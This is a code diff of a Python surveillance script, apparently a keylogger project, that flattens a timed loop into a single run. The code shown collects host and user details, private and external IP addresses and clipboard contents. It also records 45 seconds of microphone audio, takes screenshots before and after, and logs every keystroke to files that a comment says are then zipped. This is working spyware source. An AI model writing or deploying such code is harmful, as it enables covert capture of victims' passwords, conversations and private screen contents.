@@ -66,15 +66,9 @@ keys_information = "key_log.txt"
 # clipboard_information_enc = 'enc_clipboard.txt'
 # keys_information_enc = 'enc_keys_logged.txt'
 
-# Timer
-
-#current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
-
-no_of_iterations = 1
-current_iteration = 0
-iteration_duration = 15
+duration = 45
 stopping_time = 0
-file_prefix = str(datetime.now())[0:19] + ' - ' + str(current_iteration)
+file_prefix = str(datetime.now())[0:19]
 
 def on_press_func(key):
         try:
@@ -90,63 +84,57 @@ def take_screenshot(file_name):
     screenshot.save(logpath + file_prefix + file_name)
     screenshot.close()
 
+# System Information
 
-while current_iteration < no_of_iterations:
+sys_details = {}
 
-    # System Information
+sys_details.update({'architecture' : platform.architecture()})
+sys_details.update({'system_info' : platform.system()})
+sys_details.update({'uname' : platform.uname()})
+sys_details.update({'hostname' : socket.gethostname()})
+sys_details.update({'current_user' : current_user})
 
-    sys_details = {}
+# print(sys_details.items())
 
-    sys_details.update({'architecture' : platform.architecture()})
-    sys_details.update({'system_info' : platform.system()})
-    sys_details.update({'uname' : platform.uname()})
-    sys_details.update({'hostname' : socket.gethostname()})
-    sys_details.update({'current_user' : current_user})
+# sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address
 
-    # print(sys_details.items())
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+s.connect(("8.8.8.8", 80))
 
-    # sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address
+sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
+sys_details.update({'external_IP' : get('https://api.ipify.org').text})
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-    s.connect(("8.8.8.8", 80))
+sys_f = open(logpath + file_prefix + system_information, 'a')
 
-    sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
-    sys_details.update({'external_IP' : get('https://api.ipify.org').text})
+for item in sys_details.items():
+    sys_f.write(str(item) + '\n\n')
 
-    sys_f = open(logpath + file_prefix + system_information, 'a')
+sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
 
-    for item in sys_details.items():
-        sys_f.write(str(item) + '\n\n')
+sys_f.close()
 
-    sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
+# Keylogging, Microphone Capture and Screenshotting
 
-    sys_f.close()
+sampling_freq = 44100
 
-    # Keylogging, Microphone Capture and Screenshotting
+myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
 
-    sampling_freq = 44100
-    duration = iteration_duration
+take_screenshot(screenshot_information_beg)
 
-    myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
+key_f = open(logpath + file_prefix + keys_information, 'a')
 
-    take_screenshot(screenshot_information_beg)
+stopping_time = time.time() + duration
 
-    key_f = open(logpath + file_prefix + keys_information, 'a')
+with Listener(
+        on_press=on_press_func) as listener:
+    listener.join()
 
-    stopping_time = time.time() + iteration_duration
-    
-    with Listener(
-            on_press=on_press_func) as listener:
-        listener.join()
+key_f.close()
+sd.wait()
 
-    key_f.close()
-    sd.wait()
+write(logpath + file_prefix + audio_information, sampling_freq, myrecording)
 
-    write(logpath + file_prefix + audio_information, sampling_freq, myrecording)
-
-    take_screenshot(screenshot_information_end)
-
-    current_iteration += 1
+take_screenshot(screenshot_information_end)
 
 # Creating zipfile of all log files
 
